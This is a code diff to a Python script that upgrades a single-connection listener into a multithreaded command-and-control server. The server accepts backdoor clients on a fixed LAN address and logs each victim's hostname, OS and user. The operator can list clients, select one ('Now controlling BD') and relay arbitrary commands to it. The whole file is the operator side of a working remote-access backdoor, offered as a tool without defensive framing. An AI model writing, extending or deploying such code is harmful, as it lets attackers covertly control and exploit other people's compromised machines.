@@ -3,47 +3,177 @@
 import socket
 import json
 import sys
+from typing import Dict
+import os
+import threading
+import time
 
-class Allclient:
+class Allclients:
     def __init__(self, ip, port):
         self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.server.bind((ip, int(port))) 
-        self.server.listen(3)
-        print("[+] Wait...Connection....")
-        self.connection, address = self.server.accept()
-        print("[+] OK..Connect >: " + str(address))
+        self.server.bind((ip, port))
+        self.server.listen(10)
+        self.clients: Dict[str, socket.socket] = {}
+        self.client_details: Dict[str, dict] = {}
+        self.active_client = None
+        # self.logger = Logger()
+        # # self.security = SecureConnection()
+        # self.blocked_ips = set()
+        print(f"[+] Server started on {ip}:{port}")
 
-    def execute_remote(self, cmd):
-        if cmd[0] == "exit":
-            self.connection.close()
-            exit()
-        return self.connect_receive()
 
-    def connect_send(self, data):
-        json_data = json.dumps(data)
-        self.connection.send(json_data.encode())
+    def manage_client_connection(self, connection: socket.socket, address: tuple):
+        client_id = None
+        try:
+            client_info = self.connect_receive(connection)
+            client_id = f"{client_info['hostname']}_{address[0]}"
 
-    def connect_receive(self):
-        json_data = " "
+            self.clients[client_id] = connection
+            self.client_details[client_id] = {
+                'ip': address[0],
+                'port': address[1],
+                'hostname': client_info['hostname'],
+                'os': client_info['os'],
+                'user': client_info['user'],
+                'connected_time': time.strftime('%Y-%m-%d %H:%M:%S')
+            }
+
+            print(f"[+] New connection from {client_id}")
+
+            while True:
+                if not connection:
+                    break
+                try:
+                    connection.settimeout(3)
+                    data = connection.recv(1024)
+                    if not data:
+                        break
+                except socket.timeout:
+                    continue
+                except:
+                    break
+        except Exception as e:
+            print(f"[-] Client managing error: {str(e)}")
+        finally:
+            # ตรวจสอบว่า client_id มีค่าก่อนที่จะลบ
+            if client_id and client_id in self.clients:
+                del self.clients[client_id]
+                del self.client_details[client_id]
+                print(f"[-] Client {client_id} has disconnected.")
+
+
+    def list_clients(self):
+        print("\n=== Connected Clients ===")
+        for client_id, details in self.client_details.items():
+            active = " *" if client_id == self.active_client else ""
+            print(f"{client_id}{active}:")
+            for key, value in details.items():
+                print(f"  {key}: {value}")
+        print("======================")
+
+    def select_client(self, client_id: str):
+        if client_id in self.clients:
+            self.active_client = client_id
+            print(f"[+] Now controlling BD in client: {client_id}")
+        else:
+            print(f"[-] Client {client_id} not found.")
+
+
+    def connect_send(self, connection: socket.socket, data: any):
+        try:
+            json_data = json.dumps(data)
+            connection.send(json_data.encode())
+        except Exception as e:
+            raise Exception(f"Send error: {str(e)}")
+            
+
+    def connect_receive(self, connection: socket.socket) -> any:
+        json_data = ""
         while True:
             try:
-                json_data = json_data + self.connection.recv(1024).decode()
+                connection.settimeout(10)
+                part_packets = connection.recv(1024).decode()
+                if not part_packets:
+                    break
+                json_data += part_packets
                 return json.loads(json_data)
+            except socket.timeout:
+                raise Exception("Connection timed out.")
             except ValueError:
                 continue
-
-    def run_cmd(self):
+            except Exception as e:
+                raise Exception(f"Receive error: {str(e)}")
+            
+            
+    def accept_connections(self):
         while True:
             try:
-                cmd = input("Type me >>> : ").split(" ")
-
-                result = self.execute_remote(cmd)
+                conn, addr = self.server.accept()
+                client_thread = threading.Thread(target=self.manage_client_connection, 
+                                                 args=(conn, addr))
+                                                
+                client_thread.daemon = True
+                client_thread.start()
             except Exception as e:
-                result = f"[-] Error cmd execution: {str(e)}"
+                print(f"[-] Connection error: {str(e)}")    
+
+
+
+    def execute_cmd(self, cmd: list):
+        if not self.active_client:
+            print("[-] No active BD client selected.")
+            return
+        
+        try:
+            connection = self.clients[self.active_client]
+            self.connect_send(connection, cmd)
+
+            response = self.connect_receive(connection)
+            return response
+        except Exception as e:
+            return f"[-] Command execution has error: {str(e)}"
+
+    def run_cmd(self):
+        accept_thread = threading.Thread(target=self.accept_connections)
+        accept_thread.daemon = True
+        accept_thread.start()        
+        while True:
+            try:
+                cmd = input("Type me >>> : ").strip()
+                if not cmd:
+                    continue
+
+                cmd_parts = cmd.split()
+                base_cmd = cmd_parts[0].lower()
+
+                if base_cmd == "list":
+                    self.list_clients()
+
+                elif base_cmd == "select":
+                    if len(cmd_parts) < 2:
+                        print("[-] Usage: select <client_id>.")
+                    self.select_client(cmd_parts[1])
+                
+                elif base_cmd == "exit":
+                    print("[!] Shutting down server....")
+                    break
+
+                else:
+                    response = self.execute_cmd(cmd_parts)
+                    print(response)
+
+            except KeyboardInterrupt:
+                print("\n[!] Keyboard interrupt received.")
+                break
+            except Exception as e:
+                print(f"[-] Error cmd execution: {str(e)}")
             
-            print(result)
+        for connection in self.clients.values():
+            connection.close()
+        self.server.close()
+        print("\n[+] Server shutdown completed")
 
 if __name__ == "__main__":
-    server = Allclient("192.168.1.135", 5555)
+    server = Allclients("192.168.1.135", 5555)
     server.run_cmd()
